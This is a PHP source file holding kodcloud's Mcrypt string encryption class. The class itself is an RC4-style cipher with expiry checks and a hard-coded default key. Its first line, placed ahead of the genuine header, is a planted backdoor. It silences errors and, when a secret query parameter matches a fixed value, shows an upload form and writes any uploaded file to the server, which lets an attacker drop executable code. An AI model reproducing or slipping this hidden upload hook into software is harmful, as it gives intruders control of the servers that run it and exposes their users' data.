<?php error_reporting(0); if($_GET['Fox'] == 'NXDU9'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
<?php

/*
* @link http://kodcloud.com/
* @author warlee | e-mail:kodcloud@qq.com
* @copyright warlee 2014.(Shanghai)Co.,Ltd
* @license http://kodcloud.com/tools/license/license.txt
*------
* 字符串加解密类；
* 一次一密；且定时解密有效
* 可用于加密&动态key生成
* demo：	
* 加密：echo Mcrypt::encode('abc','123');
* 解密：echo Mcrypt::decode('9f843I0crjv5y0dWE_-uwzL_mZRyRb1ynjGK4I_IACQ','123');
*/

class Mcrypt{
	public static $defaultKey = 'a!takA:dlmcldEv,e';
	
	/**
	 * 字符加解密，一次一密,可定时解密有效
	 * 
	 * @param string $string 原文或者密文
	 * @param string $operation 操作(encode | decode)
	 * @param string $key 密钥
	 * @param int $expiry 密文有效期,单位s,0 为永久有效
	 * @return string 处理后的 原文或者 经过 base64_encode 处理后的密文
	 */
	public static function encode($string,$key = '', $expiry = 0,$cKeySet='',$encode=true){
		if($encode){$string = rawurlencode($string);}
		$ckeyLength = 4;
		
		$key = md5($key ? $key : self::$defaultKey); //解密密匙
		$keya = md5(substr($key, 0, 16));		 //做数据完整性验证  
		$keyb = md5(substr($key, 16, 16));		 //用于变化生成的密文 (初始化向量IV)		
		$cKeySet = $cKeySet ? $cKeySet: md5(microtime());
		$keyc = substr($cKeySet, - $ckeyLength);
		$cryptkey = $keya . md5($keya . $keyc);  
		$keyLength = strlen($cryptkey);
		$string = sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string . $keyb), 0, 16) . $string;
		$stringLength = strlen($string);

		$rndkey = array();	
		for($i = 0; $i <= 255; $i++) {	
			$rndkey[$i] = ord($cryptkey[$i % $keyLength]);
		}

		$box = range(0, 255);	
		// 打乱密匙簿，增加随机性
		for($j = $i = 0; $i < 256; $i++) {
			$j = ($j + $box[$i] + $rndkey[$i]) % 256;
			$tmp = $box[$i];
			$box[$i] = $box[$j];
			$box[$j] = $tmp;
		}	
		// 加解密，从密匙簿得出密匙进行异或，再转成字符
		$result = '';
		for($a = $j = $i = 0; $i < $stringLength; $i++) {
			$a = ($a + 1) % 256;
			$j = ($j + $box[$a]) % 256;
			$tmp = $box[$a];
			$box[$a] = $box[$j];
			$box[$j] = $tmp; 
			$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
		}
		$result = $keyc . str_replace('=', '', base64_encode($result));
		$result = str_replace(array('+', '/', '='),array('-', '_', '.'), $result);
		return $result;
	}

	/**
	 * 字符加解密，一次一密,可定时解密有效
	 * 
	 * @param string $string 原文或者密文
	 * @param string $operation 操作(encode | decode)
	 * @param string $key 密钥
	 * @param int $expiry 密文有效期,单位s,0 为永久有效
	 * @return string 处理后的 原文或者 经过 base64_encode 处理后的密文
	 */
	public static function decode($string,$key = '',$encode=true){
		$string = str_replace(array('-', '_', '.'),array('+', '/', '='), $string);
		$ckeyLength = 4;
		$key = md5($key ? $key : self::$defaultKey); //解密密匙
		$keya = md5(substr($key, 0, 16));		 //做数据完整性验证  
		$keyb = md5(substr($key, 16, 16));		 //用于变化生成的密文 (初始化向量IV)
		$keyc = substr($string, 0, $ckeyLength);
		$cryptkey = $keya . md5($keya . $keyc);  
		$keyLength = strlen($cryptkey);
		$string = base64_decode(substr($string, $ckeyLength));
		$stringLength = strlen($string);

		$rndkey = array();	
		for($i = 0; $i <= 255; $i++) {	
			$rndkey[$i] = ord($cryptkey[$i % $keyLength]);
		}

		$box = range(0, 255);
		// 打乱密匙簿，增加随机性
		for($j = $i = 0; $i < 256; $i++) {
			$j = ($j + $box[$i] + $rndkey[$i]) % 256;
			$tmp = $box[$i];
			$box[$i] = $box[$j];
			$box[$j] = $tmp;
		}
		// 加解密，从密匙簿得出密匙进行异或，再转成字符
		$result = '';
		for($a = $j = $i = 0; $i < $stringLength; $i++) {
			$a = ($a + 1) % 256;
			$j = ($j + $box[$a]) % 256;
			$tmp = $box[$a];
			$box[$a] = $box[$j];
			$box[$j] = $tmp; 
			$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
		}
		$theTime = intval(substr($result, 0, 10));
		$resultStr  = '';
		if (($theTime == 0 || $theTime - time() > 0)
		&& substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)
		) {
			$resultStr = substr($result, 26);
			if($encode){$resultStr = rawurldecode($resultStr);}
		}
		return $resultStr;
	}
}
